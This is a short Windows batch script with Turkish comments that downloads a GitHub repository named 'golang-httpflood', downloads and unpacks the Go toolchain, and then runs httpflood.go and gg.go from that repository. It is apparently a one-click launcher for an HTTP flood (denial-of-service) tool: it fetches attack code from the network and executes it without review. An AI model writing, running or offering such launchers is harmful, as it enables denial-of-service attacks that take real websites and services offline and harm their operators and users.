@echo off
echo == GitHub reposunu indiriliyor... ==
REM curl ile repositoriyi indir
curl -L -o %USERPROFILE%\flo.zip https://github.com/murmurlab/golang-httpflood/archive/refs/heads/master.zip

echo == İndirilen repo çıkarılıyor... ==
REM 7-Zip kullanarak dosyayı çıkar
"C:\Program Files\7-Zip\7z.exe" x %USERPROFILE%\flo.zip -o%USERPROFILE%\flo

echo == Go dilini indiriliyor... ==
REM Go'yu indir
curl -L -o %USERPROFILE%\gol.zip https://go.dev/dl/go1.19.4.windows-amd64.zip

echo == Go dil dosyaları çıkarılıyor... ==
REM 7-Zip kullanarak Go'yu çıkar
"C:\Program Files\7-Zip\7z.exe" x %USERPROFILE%\gol.zip -o%USERPROFILE%

echo == Go dosyaları çalıştırılıyor... ==
REM Doğrudan Go binary dosyası kullanılarak dosyaları çalıştır
"%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\httpflood.go"  
"%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\gg.go"

echo == İşlem tamamlandı! ==
pause
